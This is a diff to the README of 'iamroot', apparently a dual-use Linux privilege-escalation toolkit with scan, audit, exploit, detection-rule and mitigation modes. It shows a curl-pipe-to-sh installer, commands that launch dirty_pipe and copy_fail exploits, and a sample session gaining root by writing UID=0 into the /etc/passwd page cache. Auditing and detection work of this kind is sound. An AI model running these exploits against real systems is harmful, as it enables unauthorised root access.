@@ -24,23 +24,54 @@
 ```bash
 # One-shot install (x86_64 / arm64; checksum-verified)
 curl -sSL https://github.com/KaraZajac/IAMROOT/releases/latest/download/install.sh | sh
+```
 
-# What's this box vulnerable to?
-sudo iamroot --scan
+**iamroot runs as a normal unprivileged user** — that's the whole
+point. `--scan`, `--audit`, `--exploit`, and `--detect-rules` all
+work without `sudo`. Only `--mitigate` and rule-file installation
+write to root-owned paths.
+
+```bash
+# What's this box vulnerable to?  (no sudo)
+iamroot --scan
 
 # Broader system hygiene (setuid binaries, world-writable, capabilities, sudo)
-sudo iamroot --audit
+iamroot --audit
 
-# Deploy detection rules across every bundled module
-sudo iamroot --detect-rules --format=auditd | sudo tee /etc/audit/rules.d/99-iamroot.rules
+# Deploy detection rules (needs sudo to write /etc/audit/rules.d/)
+iamroot --detect-rules --format=auditd | sudo tee /etc/audit/rules.d/99-iamroot.rules
+
+# Apply temporary mitigations (needs sudo for modprobe.d + sysctl)
+sudo iamroot --mitigate copy_fail
 
 # Fleet scan (any-sized host list via SSH; aggregated JSON for SIEM)
 ./tools/iamroot-fleet-scan.sh --binary iamroot --ssh-key ~/.ssh/id_rsa hosts.txt
 ```
 
-`iamroot --help` lists every command. See [`CVES.md`](CVES.md) for the
-curated CVE inventory and [`docs/DEFENDERS.md`](docs/DEFENDERS.md) for
-the blue-team deployment guide.
+### Example: unprivileged → root
+
+```text
+$ id
+uid=1000(kara) gid=1000(kara) groups=1000(kara)
+
+$ iamroot --scan
+[+] dirty_pipe       VULNERABLE (kernel 5.15.0-56-generic)
+[+] cgroup_release_agent VULNERABLE (kernel 5.15 < 5.17)
+[+] pwnkit           VULNERABLE (polkit 0.105-31ubuntu0.1)
+[-] copy_fail        not vulnerable (kernel 5.15 < introduction)
+[-] dirty_cow        not vulnerable (kernel ≥ 4.9)
+
+$ iamroot --exploit dirty_pipe --i-know
+[!] dirty_pipe: kernel 5.15.0-56-generic IS vulnerable
+[+] dirty_pipe: writing UID=0 into /etc/passwd page cache...
+[+] dirty_pipe: spawning su root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+`iamroot --help` lists every command. See [`CVES.md`](CVES.md) for
+the curated CVE inventory and [`docs/DEFENDERS.md`](docs/DEFENDERS.md)
+for the blue-team deployment guide.
 
 ## What this is
 
@@ -115,10 +146,10 @@ module-loader design and how to add a new CVE.
 
 ```bash
 make                          # build all modules
-sudo ./iamroot --scan         # what's this box vulnerable to?
-sudo ./iamroot --scan --json  # machine-readable output for CI/SOC pipelines
-sudo ./iamroot --detect-rules --format=sigma > rules.yml
-sudo ./iamroot --exploit copy_fail --i-know  # actually run an exploit
+./iamroot --scan              # what's this box vulnerable to?  (no sudo)
+./iamroot --scan --json       # machine-readable output for CI/SOC pipelines
+./iamroot --detect-rules --format=sigma > rules.yml
+./iamroot --exploit copy_fail --i-know   # actually run an exploit (starts as $USER)
 ```
 
 ## Acknowledgments
